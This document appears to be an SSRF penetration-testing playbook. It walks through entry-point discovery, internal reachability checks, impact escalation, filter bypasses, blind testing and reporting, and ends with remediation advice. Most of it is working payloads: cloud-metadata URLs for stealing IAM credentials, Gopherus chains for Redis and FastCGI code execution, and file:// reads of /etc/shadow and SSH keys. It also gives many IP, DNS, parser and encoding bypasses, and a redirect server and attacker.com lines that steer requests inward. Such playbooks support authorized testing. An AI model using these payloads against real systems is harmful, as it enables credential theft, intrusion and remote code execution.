# SSRF Testing Playbook

> **Companion document:** [SSRF Mutation/Variation Taxonomy](./ssrf.md)
> **Purpose:** A systematic, phase-based procedure for discovering, confirming, escalating, and reporting Server-Side Request Forgery vulnerabilities in web applications.

---

## Phase 0 — Pre-Engagement Setup

### 0-1. Tooling Checklist

| Component | Tool | Purpose |
|---|---|---|
| **Proxy** | Burp Suite Professional | Intercept, repeat, modify requests |
| **OOB Callback Server** | Burp Collaborator or interactsh (`oast.fun`) | Blind SSRF detection via DNS/HTTP callbacks |
| **DNS Rebinding** | rbndr.us or Singularity of Origin | TOCTOU attacks against DNS-pinning defenses |
| **Payload Generators** | Gopherus, Burp-Encode-IP, SSRF-PayloadMaker | Protocol smuggling payloads, IP encoding variants |
| **Automated Scanners** | SSRFmap, Nuclei (ssrf templates) | Bulk parameter fuzzing |

### 0-2. Target Intelligence Gathering

Collect the following before testing begins:

```
□ Hosting environment: AWS / Azure / GCP / OCI / On-Premise
□ Application framework and language (Spring, Django, Express, Next.js, PHP, etc.)
□ Reverse proxy / CDN / WAF presence and product
□ Network topology: VPC layout, internal service inventory (if available)
□ Cloud metadata protection: IMDSv1 vs IMDSv2 (AWS), header requirements (Azure/GCP)
□ Known URL-accepting features: webhooks, import, preview, PDF generation, etc.
```

---

## Phase 1 — Entry Point Discovery

> **Goal:** Identify every location where the server makes outbound requests based on user-controlled input.

### 1-1. Explicit URL Parameters

Scan all request parameters for values that look like URLs or URL fragments.

**Parameter name keywords to search for:**

```
url, uri, link, href, src, dest, redirect, callback, webhook,
feed, rss, import, fetch, load, download, preview, proxy,
image_url, avatar_url, icon_url, logo_url, next, return,
target, api_url, endpoint, host, domain, server, base_url,
path, file, page, document, template, resource, source
```

**Procedure:**
1. In Burp Suite Site Map, filter for parameters matching the above keywords
2. For each candidate parameter, replace the value with a unique Burp Collaborator URL
3. If a callback is received → **SSRF entry point confirmed**, proceed to Phase 2

### 1-2. Implicit Entry Points

Server-side requests triggered by features that don't expose an obvious URL parameter:

| Feature Area | Test Method | Confirmation Signal |
|---|---|---|
| **PDF / Image Generation** | Inject `<img src="COLLABORATOR_URL">` in HTML input | HTTP callback received |
| **SVG Upload** | Upload `<svg><image href="COLLABORATOR_URL"/></svg>` | HTTP callback received |
| **File Import** | Include URL in CSV/JSON/XML import data | Callback or distinct error message |
| **Webhook Configuration** | Set webhook URL to Collaborator, trigger the event | HTTP callback received |
| **OAuth / OpenID** | Replace `issuer` or `redirect_uri` with Collaborator | HTTP/DNS callback received |
| **XML Input** | XXE payload: `<!ENTITY xxe SYSTEM "COLLABORATOR_URL">` | HTTP/DNS callback received |
| **Link Preview** | Post a URL in chat/comment; server generates preview | HTTP callback received |
| **Profile URL Fields** | Enter Collaborator URL in avatar/website fields | HTTP callback received |
| **API Integration Setup** | Enter Collaborator URL in external service config fields | HTTP callback received |
| **Markdown/Rich Text Rendering** | `![img](COLLABORATOR_URL)` in markdown input | HTTP callback received |

### 1-3. Header-Based Entry Points

Some applications use request header values to make server-side requests (e.g., fetching resources referenced in `Referer` or routing based on `Host`):

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: COLLABORATOR_URL
X-Forwarded-For: COLLABORATOR_URL
Referer: http://COLLABORATOR_URL/
Origin: http://COLLABORATOR_URL
X-Original-URL: http://COLLABORATOR_URL/
X-Rewrite-URL: http://COLLABORATOR_URL/
```

---

## Phase 2 — Reachability Testing

> **Goal:** Determine whether confirmed entry points can reach internal resources.
> **Prerequisite:** At least one SSRF entry point confirmed in Phase 1.

### 2-1. External Baseline Test

First, confirm that external URLs are fetched normally:

```
Test URL: http://COLLABORATOR_URL/baseline-test
Expected: HTTP request received at Collaborator
```

- **Received** → Entry point confirmed. Proceed to 2-2.
- **Not received** → Parameter does not trigger server-side requests. Return to Phase 1.

### 2-2. Loopback Reachability

```
http://127.0.0.1/
http://localhost/
http://127.0.0.1:PORT/
```

Common internal ports to test: `80, 443, 8080, 8443, 3000, 5000, 8000, 9090`

| Response | Interpretation | Next Step |
|---|---|---|
| 200 + internal content visible | **Full SSRF confirmed** | Phase 3 (Impact Escalation) |
| Error message (connection refused, etc.) | Server makes request but port is closed | Try different ports |
| Timeout | Firewall or network-level block | Phase 2-3 (cloud metadata) |
| "blocked", "invalid URL", "not allowed" | **Filter detected** | **Jump to Phase 4 (Bypass)** |
| Same error as non-SSRF response | SSRF not exploitable via this parameter | Test next entry point |

### 2-3. Cloud Metadata Reachability

Test based on the target's hosting environment:

```
# AWS
http://169.254.169.254/latest/meta-data/

# Azure (requires Metadata: true header — test anyway in case header injection exists)
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# GCP (requires Metadata-Flavor: Google header)
http://metadata.google.internal/computeMetadata/v1/

# OCI (v1 — no header required)
http://169.254.169.254/opc/v1/instance/
```

| Response | Interpretation |
|---|---|
| Metadata content returned | **Critical finding — report immediately** |
| "blocked" / filter response | Proceed to Phase 4 |
| Timeout | Network-level block (IMDSv2 hop limit, VPC firewall, etc.) |

### 2-4. Internal Network Reachability

If loopback works, test internal RFC 1918 ranges:

```
http://10.0.0.1/
http://172.16.0.1/
http://192.168.1.1/
http://192.168.0.1/
```

Successful response from any internal IP → internal network is reachable via SSRF.

---

## Phase 3 — Impact Escalation

> **Goal:** Demonstrate the maximum real-world impact of confirmed SSRF.

### 3-1. Cloud Credential Theft

If metadata service is reachable:

```
# AWS — Enumerate IAM role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS — Steal temporary credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}
→ Response contains: AccessKeyId, SecretAccessKey, Token

# AWS — User data (bootstrap scripts, often contain hardcoded secrets)
http://169.254.169.254/latest/user-data/

# Azure — Managed identity OAuth token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# GCP — Service account access token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

**Impact proof:** Use stolen credentials to call `aws sts get-caller-identity` → confirms credential validity and shows assumed role/account.

### 3-2. Internal Port and Service Scanning

```
Target IP ranges:
- 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
- 169.254.169.254 (metadata)
- 127.0.0.1 (loopback)

High-value ports:
80, 443, 8080, 8443        # HTTP(S) services
6379                        # Redis
11211                       # Memcached
3306                        # MySQL
5432                        # PostgreSQL
27017                       # MongoDB
9200, 9300                  # Elasticsearch
2379                        # etcd
8500, 8600                  # Consul
5000, 5001                  # Docker Registry
10250                       # Kubelet API
9090                        # Prometheus
```

**Response differentiation:**
- `Connection refused` → Host exists, port closed
- `Timeout` → Host doesn't exist or firewall blocks
- `200 / content returned` → **Service reachable**

### 3-3. RCE Chain via Gopher Protocol

If `gopher://` scheme is accepted by the SSRF entry point:

```
# Redis → RCE via crontab injection
# Generate payload with Gopherus:
gopherus --exploit redis

# FastCGI → RCE via PHP_VALUE injection
gopherus --exploit fastcgi

# MySQL → Data exfiltration (requires passwordless auth)
gopherus --exploit mysql

# SMTP → Email spoofing
gopherus --exploit smtp

# Raw gopher payload structure:
gopher://127.0.0.1:6379/_REDIS_COMMANDS_HERE
```

### 3-4. Local File Read

If `file://` scheme is accepted:

```
# Linux
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/net/tcp
file:///home/USER/.ssh/id_rsa
file:///app/.env
file:///var/www/html/config.php

# Windows
file:///C:/Windows/win.ini
file:///C:/inetpub/wwwroot/web.config
file:///C:/Users/Administrator/.ssh/id_rsa
```

### 3-5. Internal API Access

If internal services are reachable, attempt to access sensitive endpoints:

```
# Kubernetes
http://127.0.0.1:10250/pods
http://127.0.0.1:10250/run/{namespace}/{pod}/{container}

# Docker
http://127.0.0.1:2375/containers/json
http://127.0.0.1:2375/images/json

# Elasticsearch
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/_search?q=*

# Consul
http://127.0.0.1:8500/v1/agent/members
http://127.0.0.1:8500/v1/kv/?recurse

# etcd
http://127.0.0.1:2379/v2/keys/?recursive=true

# Spring Boot Actuator
http://127.0.0.1:8080/actuator/env
http://127.0.0.1:8080/actuator/configprops

# Application admin panels
http://127.0.0.1:8080/admin
http://127.0.0.1:3000/admin
```

---

## Phase 4 — Filter Bypass

> **Goal:** Systematically defeat SSRF defenses when direct internal access is blocked.
> **Prerequisite:** Phase 2 revealed filtering (blocked/invalid URL responses).

### 4-0. Filter Fingerprinting

Before attempting bypasses, characterize the filter's behavior:

```
Test 1: http://127.0.0.1/               → Blocked?
Test 2: http://example.com/              → Allowed?
Test 3: http://10.0.0.1/                 → Blocked?
Test 4: http://169.254.169.254/          → Blocked?
Test 5: http://[::1]/                    → Blocked?
Test 6: file:///etc/passwd               → Blocked?
Test 7: gopher://127.0.0.1/             → Blocked?
Test 8: http://127.0.0.1.nip.io/        → Blocked?
Test 9: http://2130706433/              → Blocked?
```

| Observed Pattern | Likely Filter Type | Priority Bypass Strategy |
|---|---|---|
| Only `127.0.0.1` blocked; `10.x.x.x` allowed | Naive string match (blocklist) | §4-1 IP encoding |
| All internal IPs blocked | IP range-based blocklist | §4-2 DNS tricks, §4-3 Redirect chains |
| Only specific domains allowed | Allowlist | §4-4 Allowlist bypass |
| `file://`, `gopher://` blocked | Protocol blocklist | §4-5 Scheme bypass |
| URL structure validated | Parser-based filter | §4-6 Parser differentials |
| Blocks after DNS resolution | Post-resolution IP check | §4-7 DNS rebinding |

### 4-1. IP Representation Mutations (Taxonomy §1)

When `127.0.0.1` or `169.254.169.254` is blocked as a string:

```
# === Bypasses for 127.0.0.1 ===

# Decimal (DWORD)
http://2130706433/

# Hexadecimal
http://0x7f000001/
http://0x7f.0x00.0x00.0x01/

# Octal
http://0177.0000.0000.0001/
http://017700000001/

# Mixed-base
http://0x7f.0.0.0x01/

# Overflow DWORD (2130706433 + N × 2^32)
http://45080379393/

# Shortened
http://127.1/
http://127.0.1/

# IPv6
http://[::1]/
http://[0000::1]/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:7f00:1]/

# Loopback range (anything in 127.0.0.0/8)
http://127.127.127.127/
http://127.0.0.2/

# Zero address
http://0/
http://0.0.0.0/


# === Bypasses for 169.254.169.254 ===

# Decimal
http://2852039166/

# Hexadecimal
http://0xa9fea9fe/

# Octal
http://0251.0376.0251.0376/

# IPv6-mapped
http://[::ffff:169.254.169.254]/

# Shortened (last two octets as 16-bit)
http://169.254.43518/
```

**Procedure:**
1. Try each payload variant one at a time
2. If any variant bypasses the filter → repeat Phase 2 reachability tests with that encoding
3. If all variants blocked → proceed to §4-2

### 4-2. DNS-Based Bypass (Taxonomy §2, §6)

When all direct IP representations are blocked, use DNS resolution to map a "legitimate" hostname to an internal IP:

```
# Wildcard DNS services
http://127.0.0.1.nip.io/
http://169.254.169.254.nip.io/
http://anything.localtest.me/              # Always resolves to 127.0.0.1
http://127.0.0.1.sslip.io/
http://spoofed.burpcollaborator.net/       # Configure Collaborator DNS to return internal IP

# Attacker-controlled domain
# Set A record of internal.attacker.com → 127.0.0.1
http://internal.attacker.com/

# CNAME chain
# attacker.com → CNAME → internal-service.target.local
http://redirect.attacker.com/
```

**DNS Rebinding (when post-resolution IP validation exists):**

```
Concept:
1. Create domain at rbndr.us: {ALLOWED_IP_HEX}.{TARGET_IP_HEX}.rbndr.us
2. First DNS query → returns ALLOWED_IP (passes validation)
3. Second DNS query → returns TARGET_IP (actual request)
4. TTL=0 ensures no caching

Steps:
1. Convert allowed external IP to hex: e.g., 93.184.216.34 → 5db8d822
2. Convert target internal IP to hex: e.g., 169.254.169.254 → a9fea9fe
3. Test URL: http://5db8d822.a9fea9fe.rbndr.us/latest/meta-data/
4. Repeat multiple times (non-deterministic — race condition)
5. For reliable exploitation, use Singularity of Origin framework
```

### 4-3. Redirect Chain Bypass (Taxonomy §7)

When the filter validates the initial URL but the application follows HTTP redirects without re-validating:

```
# Set up attacker-controlled redirect server:

# Python redirect server example:
from http.server import HTTPServer, BaseHTTPRequestHandler

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
        self.end_headers()

HTTPServer(('0.0.0.0', 80), RedirectHandler).serve_forever()
```

**Test matrix:**

```
1. http://attacker.com/redir → 302 → http://169.254.169.254/
   (Basic redirect to internal IP)

2. http://attacker.com/redir → 302 → gopher://127.0.0.1:6379/...
   (Protocol switching via redirect — HTTP to gopher)

3. http://attacker.com/redir → 307 → POST http://internal-api/admin
   (Method-preserving redirect for POST-based SSRF)

4. http://allowed-domain.com/open-redirect?url=http://169.254.169.254/
   (Chaining through an open redirect on an allowed domain)

5. http://attacker.com/redir1 → 302 → http://attacker.com/redir2 → 302 → http://169.254.169.254/
   (Multi-hop chain to evade per-hop checks)
```

**Key questions to answer:**
- Does the application follow redirects at all?
- Is the redirect destination URL re-validated?
- Is protocol switching (http → gopher/file) allowed through redirects?
- Is there a redirect count limit?

### 4-4. Allowlist Bypass (Taxonomy §2-3, §5)

When only specific domains are permitted:

```
# @ notation — filter sees "allowed.com", requester connects to attacker.com
http://allowed.com@attacker.com/
http://allowed.com%40attacker.com/
http://allowed.com%2540attacker.com/          # Double-encoded @

# Subdomain tricks
http://attacker.com.allowed.com/              # If wildcard subdomain, attacker controls this
http://allowed.com.attacker.com/              # Reversed — filter may match "allowed.com" substring

# Fragment + @
http://allowed.com#@attacker.com/

# Null byte truncation
http://allowed.com%00.attacker.com/

# Backslash (WHATWG vs RFC parser differential)
http://allowed.com\@attacker.com/

# Open redirect on the allowed domain itself
http://allowed.com/redirect?url=http://169.254.169.254/

# Subdomain takeover
# If *.allowed.com has a dangling CNAME, claim it and point to attacker server
```

### 4-5. Scheme/Protocol Bypass (Taxonomy §3)

When only `http(s)://` is allowed or `file://`/`gopher://` is explicitly blocked:

```
# Case variation
FILE:///etc/passwd
GOPHER://127.0.0.1:6379/...
File:///etc/passwd
gOpHeR://127.0.0.1:6379/...

# Malformed scheme delimiter
http:/attacker.com               # Single slash
http:\\attacker.com               # Backslash

# Protocol switching via redirect (bypass scheme filter at initial request)
http://attacker.com/redir → 302 → gopher://127.0.0.1:6379/...
http://attacker.com/redir → 302 → file:///etc/passwd

# Alternative protocols (if not explicitly blocked)
dict://127.0.0.1:6379/INFO
tftp://attacker.com/exfil
ldap://127.0.0.1:389/
jar://127.0.0.1!/file.txt
```

### 4-6. URL Parser Differential Exploitation (Taxonomy §5)

Exploit inconsistencies between the validation library and the requesting library:

```
# Tab/newline injection in authority
http://127.0.0.1\texample.com/

# Fragment as host confusion
http://127.0.0.1#@allowed.com/

# Double URL encoding in path
http://127.0.0.1/%252e%252e/admin

# Semicolon as path parameter
http://allowed.com;@127.0.0.1/

# Unicode normalization
http://ⅼocalhost/                  # ⅼ = U+217C (Roman numeral small L)
http://１２７．０．０．１/          # Fullwidth digits and period
http://127。0。0。1/                # U+3002 ideographic period

# Zero-width characters embedded in hostname
http://local​host/                  # Zero-width space (U+200B) between "local" and "host"
http://local­host/                  # Soft hyphen (U+00AD)

# NFKC normalization exploitation
http://ﬁle:///etc/passwd            # "fi" ligature (U+FB01) → normalized to "fi"
```

### 4-7. Encoding Layer Bypass (Taxonomy §4)

```
# Single percent-encoding
http://127%2e0%2e0%2e1/

# Double percent-encoding
http://127%252e0%252e0%252e1/

# Triple encoding (for 3-stage decoding pipelines)
http://127%25252e0%25252e0%25252e1/

# Full hostname encoding
http://%6c%6f%63%61%6c%68%6f%73%74/   # = "localhost"

# Mixed encoding
http://127.0.0%2e1/
http://127.0.%300.1/                   # Overlong UTF-8

# Selective encoding of dots only
http://127%2E0%2E0%2E1/
```

---

## Phase 5 — Blind SSRF Testing

> **Goal:** Confirm SSRF and assess impact when server responses are not directly visible.

### 5-1. Out-of-Band (OOB) Detection

```
# DNS-based (most reliable — DNS almost never blocked outbound)
http://UNIQUE_ID.burpcollaborator.net/
http://UNIQUE_ID.oast.fun/

# HTTP-based
http://ATTACKER_SERVER:8080/ssrf-callback?param=PARAM_NAME

# SSRF canary chaining
# SSRF → hit internal service → internal service makes outbound request → callback received
# Useful when direct outbound from the SSRF target is blocked but internal services have egress
```

### 5-2. Timing-Based Inference

```
Procedure:
1. Measure response time for a known-open internal port:
   http://127.0.0.1:80/    → e.g., 50ms response

2. Measure response time for a known-closed port:
   http://127.0.0.1:9999/  → e.g., 200ms (connection refused is fast)

3. Measure response time for a non-existent host:
   http://10.0.0.99/       → e.g., 5000ms (timeout)

4. If timing differences are consistent:
   → Blind SSRF confirmed
   → Internal port scanning is possible via timing oracle
```

### 5-3. Error-Based Inference

```
Analyze response message differences:
- "Connection refused"    → Host exists, port closed
- "No route to host"     → Host does not exist
- "Connection timed out" → Firewall blocks traffic
- "200 OK" (different content length) → Service reachable

HTTP status code differences:
- 500 vs 502 vs 504 may reveal different internal states
- Response body size differences between open/closed ports
```

---

## Phase 6 — Reporting

### 6-1. Severity Rating Guide

| Impact | CVSS Range | Condition |
|---|---|---|
| **Critical** | 9.0–10.0 | Cloud credential theft (IAM keys, managed identity tokens, service account tokens) |
| **Critical** | 9.0–10.0 | RCE chain (gopher → Redis/FastCGI/etc.) |
| **High** | 7.0–8.9 | Internal API access leading to data exfiltration or privilege escalation |
| **High** | 7.0–8.9 | Local file read (source code, configuration files, SSH keys) |
| **Medium** | 4.0–6.9 | Internal port scanning / network mapping |
| **Medium** | 4.0–6.9 | Blind SSRF confirmed via OOB callback (no response content visible) |
| **Low** | 1.0–3.9 | SSRF to external URLs only (no internal access demonstrated) |

### 6-2. Report Template

```markdown
## Title
Server-Side Request Forgery (SSRF) in [Feature/Endpoint Name]

## Summary
[1-2 sentences describing the vulnerability and its maximum demonstrated impact]

## Impact
- Attacker can access [specific internal resources]
- This enables [specific consequences: credential theft, data exfiltration, RCE, etc.]
- Affected environment: [AWS/Azure/GCP, internal services, etc.]

## Steps to Reproduce
1. Navigate to [endpoint] / Send [HTTP method] request to [URL]
2. In the [parameter name] parameter, insert: [payload]
3. Observe that [internal data / callback / timing difference] confirms SSRF

## HTTP Request
[Full HTTP request from Burp Suite]

## HTTP Response
[Full or relevant portion of HTTP response]

## Proof of Impact
- Internal resources accessed: [list]
- Data types exposed: [describe, with sensitive values redacted]
- If attack chain exists: [describe full chain from SSRF to final impact]
- Screenshots / Collaborator interaction logs

## Remediation Recommendations
[See §6-3]
```

### 6-3. Remediation Recommendations Template

```markdown
## Immediate Mitigations
1. Apply a strict allowlist of permitted destination hosts/IPs for the affected feature
2. Block all internal IP ranges at the application level:
   - 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16
   - Include all IP representation variants (decimal, hex, octal, IPv6-mapped)
3. Disable unnecessary URL schemes: block gopher://, file://, dict://, tftp://, ldap://
4. Do not follow HTTP redirects in server-side URL fetching, or re-validate
   the destination after each redirect hop

## Structural Remediation
1. DNS resolution pinning: resolve the hostname once, validate the resolved IP
   against the blocklist, then connect to that specific IP — eliminating the
   TOCTOU window exploited by DNS rebinding
2. Network-level egress controls: restrict outbound traffic from application
   servers to only approved external destinations via firewall rules
3. Cloud metadata hardening:
   - AWS: Enforce IMDSv2 across all instances; set metadata hop limit to 1
   - Azure/GCP: Verify custom header requirements are enforced
   - Consider disabling metadata service entirely where not needed
4. Architecture review: audit all features where the server acts as an HTTP
   client on behalf of user input (webhooks, imports, previews, PDF generation,
   OAuth, AI/LLM tool use)
```

---

## Appendix A — Quick Checklist

When testing time is limited, prioritize these steps:

```
[ ] 1. Identify URL-accepting parameters (Phase 1-1 keyword search)
[ ] 2. Insert Collaborator URL → confirm SSRF entry points
[ ] 3. Test http://127.0.0.1/ → determine if filter exists
[ ] 4. If filtered: try 5 IP encoding variants (§4-1)
[ ] 5. If filtered: try DNS wildcard services — nip.io, localtest.me (§4-2)
[ ] 6. If filtered: try redirect chain from attacker server (§4-3)
[ ] 7. Test cloud metadata access (169.254.169.254)
[ ] 8. For blind SSRF: prove reachability via OOB callback at minimum
```

## Appendix B — Cloud Metadata Quick Reference

| Cloud | Metadata URL | Protection | Bypass Requirement |
|---|---|---|---|
| **AWS (v1)** | `http://169.254.169.254/latest/meta-data/` | None | Simple SSRF is sufficient |
| **AWS (v2)** | PUT `http://169.254.169.254/latest/api/token` | Session token + TTL header required | Header injection needed (request smuggling, CRLF) |
| **Azure** | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | `Metadata: true` header required | Header injection needed |
| **GCP** | `http://metadata.google.internal/computeMetadata/v1/` | `Metadata-Flavor: Google` header required | Header injection needed |
| **OCI (v1)** | `http://169.254.169.254/opc/v1/instance/` | None | Simple SSRF is sufficient |

## Appendix C — Decision Flowchart

```
SSRF Entry Point Found (Phase 1)
       │
       ▼
  External URL callback received?
  ┌─ No ──→ Not an SSRF entry point. Test next parameter.
  │
  └─ Yes
       │
       ▼
  Can reach http://127.0.0.1/?
  ┌─ Yes ──→ Full SSRF confirmed → Phase 3 (Impact Escalation)
  │
  └─ No (filter detected)
       │
       ▼
  IP encoding variants bypass filter? (§4-1)
  ┌─ Yes ──→ Full SSRF → Phase 3
  │
  └─ No
       │
       ▼
  DNS wildcard services bypass filter? (§4-2)
  ┌─ Yes ──→ Full SSRF → Phase 3
  │
  └─ No
       │
       ▼
  Redirect chain bypasses filter? (§4-3)
  ┌─ Yes ──→ Full SSRF → Phase 3
  │
  └─ No
       │
       ▼
  URL parser differentials / encoding layers? (§4-4 through §4-7)
  ┌─ Yes ──→ Full SSRF → Phase 3
  │
  └─ No
       │
       ▼
  DNS rebinding bypasses post-resolution check? (§4-2 rebinding)
  ┌─ Yes ──→ Full SSRF → Phase 3
  │
  └─ No
       │
       ▼
  Blind SSRF only (OOB callback received, no internal content visible)
       │
       ▼
  Timing/error-based internal port scan → Report as Medium severity
```

---

*This playbook is intended for authorized security assessments and defensive security research purposes only.*
